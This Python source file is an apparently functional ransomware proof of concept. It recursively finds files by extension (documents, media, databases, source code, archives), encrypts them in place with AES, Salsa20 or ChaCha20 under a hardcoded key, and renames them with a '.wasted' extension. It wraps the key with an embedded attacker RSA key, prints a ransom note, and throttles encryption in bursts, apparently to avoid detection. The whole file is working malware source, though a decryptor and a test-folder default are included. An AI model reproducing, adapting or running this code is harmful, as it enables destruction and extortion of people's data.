from argparse import ArgumentParser
from base64 import b64encode, b64decode
from os import environ, path, rename, walk
from sys import argv
from time import time, sleep

from Crypto.Cipher import AES, ChaCha20, Salsa20, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Util import Counter
from Crypto.Util.Padding import pad, unpad

from globals import get_config_from_file

# ============================================================
# ============ 		GLOBALS 	  ==============
# ============================================================

LINUX_STARTDIRS = [environ['HOME'] + '/test_ransomware']
EXTENSION = ".wasted"  # Ransomware custom extension

# ============================================================
# ============ 		KEYS 	  ==============
# ============================================================

#  set to either: '128/192/256 bit plaintext key' or False
HARDCODED_KEY = b'+KbPeShVmYq3t6w9z$C&F)H@McQfTjWn'  # 32-bytes AES 256-key used to encrypt files
SERVER_PUBLIC_RSA_KEY = '''-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAklmKLXGK6jfMis4ifjlB
xSGMFCj1RtSA/sQxs4I5IWvMxYSD1rZc+f3c67DJ6M8aajHxZTidXm+KEGk2LGXT
qPYmZW+TQjtrx4tG7ZHda65+EdyVJkwp7hD2fpYJhhn99Cu0J3A+EiNdt7+EtOdP
GhYcIZmJ7iT5aRCkXiKXrw+iIL6DT0oiXNX7O7CYID8CykTf5/8Ee1hjAEv3M4re
q/CydAWrsAJPhtEmObu6cn2FYFfwGmBrUQf1BE0/4/uqCoP2EmCua6xJE1E2MZkz
vvYVc85DbQFK/Jcpeq0QkKiJ4Z+TWGnjIZqBZDaVcmaDl3CKdrvY222bp/F20LZg
HwIDAQAB
-----END PUBLIC KEY-----'''  # Attacker's embedded public RSA key used to encrypt AES key
SERVER_PRIVATE_RSA_KEY = '''-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAklmKLXGK6jfMis4ifjlBxSGMFCj1RtSA/sQxs4I5IWvMxYSD
1rZc+f3c67DJ6M8aajHxZTidXm+KEGk2LGXTqPYmZW+TQjtrx4tG7ZHda65+EdyV
Jkwp7hD2fpYJhhn99Cu0J3A+EiNdt7+EtOdPGhYcIZmJ7iT5aRCkXiKXrw+iIL6D
T0oiXNX7O7CYID8CykTf5/8Ee1hjAEv3M4req/CydAWrsAJPhtEmObu6cn2FYFfw
GmBrUQf1BE0/4/uqCoP2EmCua6xJE1E2MZkzvvYVc85DbQFK/Jcpeq0QkKiJ4Z+T
WGnjIZqBZDaVcmaDl3CKdrvY222bp/F20LZgHwIDAQABAoIBAFLE80IaSi+HGVaT
mKx8o3bjLz8jnvzNKJttyJI2nysItcor1Qh1IQZ+Dhj6ZmcV4mGXF2hg6ZfES3hW
mL3pZRjVBgguX0GBK8ayPY4VBf5ltIVTlMMRJlGvJEmZf49pWdhjc0Mu1twZRmKq
nVpWy8T8JjLWjEy0ep5yPBPFSrZFphQdiZxTrnmNR/Ip48XXGnQtRuNGSsNattc/
2UYmLjSYTPasSV7PeXtGGaw34dfiKKlh4anXzjl1ARcVEgDRG617y8eK3aGDpU5G
5bm/M4kZ7xXVtrPuAlhcZPgPrPG2VH9/DTc1IzEXG65pAwC+WhCZv3xFRTYTz9ca
qj4sYKkCgYEA+eBkkFb7K/t3JfE9AGwNBdmXepdgVOiBbKBxwXl4XbjTQn1BGCsQ
0FmgaFUhL3SmDYvNuNnF1kFeXOlghMR4v1DOSttcrqEU0oztLDdY1PKxHBusp2oy
RvK+JPZVMt8yRQkPWjVlSKWWgqO+Yd5QONWMKAfA1f3zCa1Rj/1ouwMCgYEAle+r
QDIWri6e/mdim/ec/irpCRBn/2XTK1J0kqog1vmovIhhxHlTw7bb/S168afYY8v8
TUJgKgnqGYmo/RVreMs+IZoN8ZoqkKBRRC00C/EpiDSv4q8EfHgzAP3Jpfk29brc
QxEkClaXssRG/N8bK2aiUgztM4HabFSocWW5DbUCgYAcMQbnigi4g5yDuV3qiEZH
3K7Mc/u4WKsReGCdNXkxCcM8Aymu8lzpRNNmMgSWeBCsApPpQRii/akJzoLHN+tv
mkxMAcfJI/9XafLwRCZPkDoPM8gc80xM2OI/BVPDc48WXtlOkiulMJl0j8jQ/eYL
I3y2n3lQK2CaPOWw2yRPxQKBgHcpshslM+1fVDGxDSgUFYvTor33chADZ19I+ykN
WWhBp5+fbMRwAOjNTe3b1Zh14379QhpNJIyEsK93Pv1VpsKsFUczXt2jvyyOncfn
fTP4iR+dcCRjINej2DVzfm4QsWN/DUuoNdKZm5sSb7DNyJQnz94SM/r5uxTZ+72U
MQz5AoGBAK/R9Fx7UBmHcC+9ehBJ5aPzvU8DqiVYg2wAYGu/n81s30VdtTQwfSed
14roox6zaAk8fEZ/nkS86evh6PqjfhSuniBoqvQllAPZTXdOm8KPchNU8VC+iSzw
+IbSWacaVjzrtfY/UcRkUrgQotk8a4kPZrijPogn060VnXPEeq3t
-----END RSA PRIVATE KEY-----'''  # SHOULD NOT BE INCLUDED - only for decryptor purposes


def discover_files(start_path):
    """
    Walk the path recursively down from start_path, and perform method on matching files
    :param start_path: a directory (preferably absolute) from which to start recursive discovery.
    :yield: a generator of filenames matching the conditions.

    Notes:
        - no error checking is done. It is assumed the current user has rwx on
          every file and directory from the start_path down.
        - state is not kept. If this function raises an exception at any point,
          there is no way of knowing where to continue from.
    """

    # This is a file extension list of all files that may want to be encrypted.
    # They are grouped by category. If a category is not wanted, Comment that line.
    # All files uncommented by default should be harmless to the system
    # that is: Encrypting all files of all the below types should leave a system in a bootable state,
    # BUT applications which depend on such resources may become broken.
    # This will not cover all files, but it should be a decent range.
    extensions = [
        # 'exe,', 'dll', 'so', 'rpm', 'deb', 'vmlinuz', 'img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
        'jpg', 'jpeg', 'bmp', 'gif', 'png', 'svg', 'psd', 'raw',  # images
        'mp3', 'mp4', 'm4a', 'aac', 'ogg', 'flac', 'wav', 'wma', 'aiff', 'ape',  # music and sound
        'avi', 'flv', 'm4v', 'mkv', 'mov', 'mpg', 'mpeg', 'wmv', 'swf', '3gp',  # Video and movies

        'doc', 'docx', 'xls', 'xlsx', 'ppt', 'pptx',  # Microsoft Office
        'odt', 'odp', 'ods', 'txt', 'rtf', 'tex', 'pdf', 'epub', 'md',  # OpenOffice, Adobe, Latex, Markdown, etc
        'yml', 'yaml', 'json', 'xml', 'csv',  # structured data
        'db', 'sql', 'dbf', 'mdb', 'iso',  # databases and disc images

        'html', 'htm', 'xhtml', 'php', 'asp', 'aspx', 'js', 'jsp', 'css',  # web technologies
        'c', 'cpp', 'cxx', 'h', 'hpp', 'hxx',  # C source code
        'java', 'class', 'jar',  # java source code
        'ps', 'bat', 'vb',  # windows based scripts
        'awk', 'sh', 'cgi', 'pl', 'ada', 'swift',  # linux/mac based scripts
        'go', 'py', 'pyc', 'bf', 'coffee',  # other source code files

        'zip', 'tar', 'tgz', 'bz2', '7z', 'rar', 'bak',  # compressed formats

        EXTENSION.split(".")[1],  # ransomware extension, drop dot from global constant
    ]

    for dir_path, dirs, files in walk(start_path):
        for i in files:
            absolute_path = path.abspath(path.join(dir_path, i))
            ext = absolute_path.split('.')[-1]
            if ext in extensions:
                yield absolute_path


def modify_file_inplace(file_name, crypto, flag, block_size=16):
    """
    Open `filename` and encrypt/decrypt according to `crypto`
    :param file_name: a filename (preferably absolute path)
    :param crypto: a stream cipher function that takes in a plaintext,
             and returns a ciphertext of identical length
    :param flag: which algorithm is used and in which mode (enc/dec)
    :param block_size: length of blocks to read and write.
    :return: None
    """
    with open(file_name, 'r+b') as f:
        plaintext = f.read(block_size)

        while plaintext:
            match flag[0]:
                case "0":  # AES-CBC
                    if flag[1] == "0":  # encrypt, pad
                        if len(plaintext) < block_size:
                            padded = pad(plaintext, block_size)
                            ciphertext = crypto(padded)
                        else:
                            ciphertext = crypto(plaintext)
                    else:  # decrypt, unpad
                        decrypted = crypto(plaintext)
                        if decrypted.endswith(b"\x0b"):  # padding character
                            ciphertext = unpad(decrypted, block_size)
                        else:
                            ciphertext = decrypted
                case "1" | "2" | "3" | _:
                    ciphertext = crypto(plaintext)

            f.seek(-len(plaintext), 1)  # return to same point before the read
            f.write(ciphertext)

            if len(ciphertext) < len(plaintext):
                # since the decrypted text is smaller than the encrypted, the block_size was not reached.
                # this means that we have reached the EOF of the original file
                f.truncate()

            plaintext = f.read(block_size)


def select_encryption_algorithm(key):
    config = get_config_from_file()
    match config["ALGORITHM"]["algo"]:
        case "AES-CBC":
            assert len(key) in [16, 24, 32]
            cipher = AES.new(key=key, mode=AES.MODE_CBC)
            return cipher, ".0", b64encode(cipher.iv).decode("utf-8").replace("/", "-#-")  # avoid "/" in filenames
        case "AES-CTR":
            assert len(key) in [16, 24, 32]
            ctr = Counter.new(128)
            return AES.new(key=key, mode=AES.MODE_CTR, counter=ctr), ".1", None
        case "Salsa20":
            assert len(key) == 32
            cipher = Salsa20.new(key=key)
            return cipher, ".2", b64encode(cipher.nonce).decode("utf-8").replace("/", "-#-")  # avoid "/" in filenames
        case "ChaCha20":
            assert len(key) == 32
            cipher = ChaCha20.new(key=key)
            return cipher, ".3", b64encode(cipher.nonce).decode("utf-8").replace("/", "-#-")  # avoid "/" in filenames
        case _:
            assert len(key) in [16, 24, 32]
            print("unknown encryption algorithm config used. Falling back to default AES-CTR encryption")
            ctr = Counter.new(128)
            return AES.new(key, AES.MODE_CTR, counter=ctr), ".1", None


def select_decryption_algorithm(filename, key):
    split = path.basename(filename).split(".")[-2].split("--")
    flag = split[0]
    extra = split[1] if len(split) > 1 else None
    match flag:
        case "0":
            assert len(key) in [16, 24, 32]
            return AES.new(key=key, mode=AES.MODE_CBC, iv=b64decode(extra.replace("-#-", "/"))), "0"
        case "1":
            assert len(key) in [16, 24, 32]
            ctr = Counter.new(128)
            return AES.new(key=key, mode=AES.MODE_CTR, counter=ctr), "1"
        case "2":
            assert len(key) == 32
            return Salsa20.new(key=key, nonce=b64decode(extra.replace("-#-", "/"))), "2"
        case "3":
            assert len(key) == 32
            return ChaCha20.new(key=key, nonce=b64decode(extra.replace("-#-", "/"))), "3"
        case _:
            assert len(key) in [16, 24, 32]
            print("unknown encryption algorithm config was used. Falling back to default AES-CTR decryption")
            ctr = Counter.new(128)
            return AES.new(key, AES.MODE_CTR, counter=ctr), "1"


def encrypt_files(key, start_dirs):
    file_counter = 0
    file_sizes = 0
    burst_start = time()

    # Recursively go through folders and encrypt files
    for curr_dir in start_dirs:
        for file in discover_files(curr_dir):
            if not file.endswith(EXTENSION):
                config = get_config_from_file()
                duration = int(config["BURST"]["duration"][1:])  # format examples "s5" or "f30"
                limit_files = config["BURST"]["duration"].startswith("f")
                rate = float(config["BURST"]["rate"])

                file_sizes += path.getsize(file)  # file size in bytes (= nr of characters)

                crypt, flag, extra = select_encryption_algorithm(key)
                modify_file_inplace(file, crypt.encrypt, flag[1:] + "0")

                encrypted_name = file + (flag if not extra else flag + "--" + extra) + EXTENSION
                rename(file, encrypted_name)
                print("File changed from " + file + " to " + encrypted_name)  # keep!

                file_counter += 1

                burst_running = time() - burst_start
                if rate > 0 and rate * burst_running < file_sizes:  # burst rate is limited
                    # if r * b < f then r * (b + n) = f, thus n = f/r - b
                    even_out = (file_sizes / rate) - burst_running
                    print("sleeping for", even_out, "to limit rate")
                    sleep(even_out)

                if duration > 0:  # burst duration is limited
                    reset_burst = False
                    if limit_files:
                        print("bursting for", file_counter, "files")
                        if file_counter >= duration:
                            reset_burst = True
                            print("sleeping for", config["BURST"]["pause"])
                            sleep(int(config["BURST"]["pause"]))
                    else:  # limit seconds instead of files
                        print("bursting for", time() - burst_start, "seconds")
                        if time() - burst_start >= duration:
                            reset_burst = True
                            print("sleeping for", config["BURST"]["pause"])
                            sleep(int(config["BURST"]["pause"]))
                    if reset_burst:
                        file_counter = 0
                        file_sizes = 0
                        burst_start = time()


def decrypt_files(key, start_dirs):
    # Recursively go through folders and decrypt files
    for curr_dir in start_dirs:
        for file in discover_files(curr_dir):
            if file.endswith(EXTENSION):
                crypt, flag = select_decryption_algorithm(file, key)
                modify_file_inplace(file, crypt.decrypt, flag[-1] + "1")

                abs_dir = path.dirname(file)
                file_original = ".".join(path.basename(file).split(".")[:-2])
                rename(file, path.join(abs_dir, file_original))
                print("File changed from " + file + " to " + file_original)


def run(absolute_paths, encrypt):
    if absolute_paths != 'None':
        start_dirs = absolute_paths.split(",")
    else:
        start_dirs = LINUX_STARTDIRS

    # Encrypt AES key with attacker's embedded RSA public key
    server_key = RSA.importKey(SERVER_PUBLIC_RSA_KEY)
    encryptor = PKCS1_OAEP.new(server_key)
    encrypted_key_b64 = b64encode(encryptor.encrypt(HARDCODED_KEY)).decode("ascii")
    print("Encrypted key", encrypted_key_b64, "\n")

    if encrypt:
        print("[COMPANY_NAME]\n\n"
              "YOUR NETWORK IS ENCRYPTED NOW\n"
              "USE - TO GET THE PRICE FOR YOUR DATA\n"
              "DO NOT GIVE THIS EMAIL TO 3RD PARTIES\n"
              "DO NOT RENAME OR MOVE THE FILE\n"
              "THE FILE IS ENCRYPTED WITH THE FOLLOWING KEY\n"
              "[begin_key]\n{}\n[end_key]\n"
              "KEEP IT\n".format(SERVER_PUBLIC_RSA_KEY))
        key = HARDCODED_KEY
    else:
        # RSA Decryption function - warning that private key is hardcoded for testing purposes
        rsa_key = RSA.importKey(SERVER_PRIVATE_RSA_KEY)
        decryptor = PKCS1_OAEP.new(rsa_key)
        key = decryptor.decrypt(b64decode(encrypted_key_b64))

    if encrypt:
        encrypt_files(key, start_dirs)
    else:
        decrypt_files(key, start_dirs)


def parse_args():
    parser = ArgumentParser(description='Ransomware PoC')
    parser.add_argument('-p', '--path',
                        help='Comma-separated (no-whitespace) list of absolute paths to start encryption. '
                             + 'If none specified, defaults to %%HOME%%/test_ransomware',
                        action="store")

    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('-e', '--encrypt', help='Enable encryption of files',
                       action='store_true')
    group.add_argument('-d', '--decrypt', help='Enable decryption of encrypted files',
                       action='store_true')

    return parser.parse_args()


def main():
    if len(argv) <= 1:
        print('[*] Ransomware - PoC\n')
        print('Usage: python3 main.py -h')
        print('{} -h for help.'.format(argv[0]))
        exit(0)

    # Parse arguments
    args = parse_args()
    encrypt = args.encrypt
    # decrypt = args.decrypt
    absolute_paths = str(args.path)

    run(absolute_paths, encrypt)


if __name__ == "__main__":
    main()
